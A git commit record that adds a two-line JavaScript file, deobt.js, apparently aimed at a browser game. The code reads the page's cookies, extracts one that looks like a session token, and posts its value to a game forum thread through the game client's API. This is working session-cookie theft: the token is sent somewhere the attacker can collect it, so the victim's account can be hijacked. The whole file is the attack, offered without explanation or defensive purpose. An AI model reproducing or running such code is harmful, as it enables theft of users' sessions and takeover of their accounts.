612fd27c3f089d12449272d2b58d5eedad4dfcc7
parsesml <113039052+parsesml@users.noreply.github.com>
2023-08-14 21:05:46 +0100

    Create deobt.js

---
+++ deobt.js
@@ -0,0 +1,2 @@
+document.cookie.split(";").forEach(jtx=>{if(jtx.includes("s=s")){xxdl=jtx.substr(2)}});
+ig.game.O2185.addForumThreadAndFirstComment_P("64da8794054e5446fc998379", "cookie", xxdl, [])
